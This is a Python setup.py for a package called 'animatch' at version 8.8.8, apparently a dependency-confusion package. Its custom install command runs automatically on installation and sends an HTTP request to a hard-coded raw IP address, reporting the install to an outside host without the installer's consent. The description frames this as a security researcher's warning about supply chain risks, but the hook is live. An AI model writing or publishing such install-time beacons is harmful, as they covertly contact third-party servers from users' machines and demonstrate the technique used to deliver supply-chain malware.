#!/usr/bin/env python
# coding: utf-8

from setuptools import setup
from setuptools.command.install import install
import requests

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        url = 'http://101.32.99.28/name?animatch'
        requests.get(url, timeout=30)

setup(
    name='animatch',
    version='8.8.8',
    author='RemindSupplyChainRisks',
    author_email='RemindSupplyChainRisks@gmail.com',
    url='https://github.com/animatch',
    description='Remind Supply Chain Risks: I am a security researcher, the purpose is to make everyone pay attention to software supply chain attacks, because the risks are too great.',
    packages=['animatch'],
    install_requires=['requests'],
    cmdclass={
        'install': CustomInstallCommand,
    },
)

